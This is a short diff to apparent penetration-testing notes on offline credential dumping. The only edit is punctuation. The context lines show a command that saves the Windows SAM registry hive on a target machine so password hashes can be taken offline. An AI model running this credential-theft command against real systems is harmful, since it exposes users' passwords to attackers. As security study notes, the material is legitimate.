@@ -429,7 +429,7 @@ Full breakdown: [[Password Attacks (Breakdowns)#memssp: why SSPI-layer intercept
 
 #### Step 6: Offline Credential Dump Alternatives (when Mimikatz is blocked or post-exfil)
 
-**SAM offline dump** (no Mimikatz binary needed — uses built-in reg.exe):
+**SAM offline dump** (no Mimikatz binary needed, uses built-in reg.exe):
 ```cmd
 :: On target (admin cmd):
 reg save HKLM\SAM C:\Temp\SAM
